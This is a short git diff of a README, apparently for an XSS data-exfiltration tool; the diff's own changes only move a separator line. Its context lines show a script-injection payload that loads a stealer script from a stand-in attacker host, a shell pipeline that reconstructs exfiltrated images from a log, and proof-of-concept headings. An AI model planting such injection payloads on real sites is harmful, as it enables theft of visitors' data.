@@ -48,8 +48,6 @@ Inject: **<script src="http://STEALER_URI:8080/reciver.js"></script>**
 #### Images: 
 ```cat exfiLeaks.log | awk -F'/exfil/<hash>/' '{print $2}' | cut -d"/" -f2- | awk -F'.jpg' '{print $1}' | awk '!seen[$0]++' | tr -d '\n' | base64 -d > tal.png```
 
-______________________________________________________________________________________________________________________________________________
-
 ## POC
 
 ##### Start server
@@ -60,6 +58,7 @@ ________________________________________________________________________________
 
 ##### Extract content 
 ![image alt](https://i.imgur.com/QlSzAlB.png "2")
-
+_____________________________________________________________________________________________________________________________________________
 by [@j0moz4](https://twitter.com/J0MoZ4)
+
 **Thnx to:** [https://github.com/hoodoer/XSS-Data-Exfil](https://github.com/hoodoer/XSS-Data-Exfil)
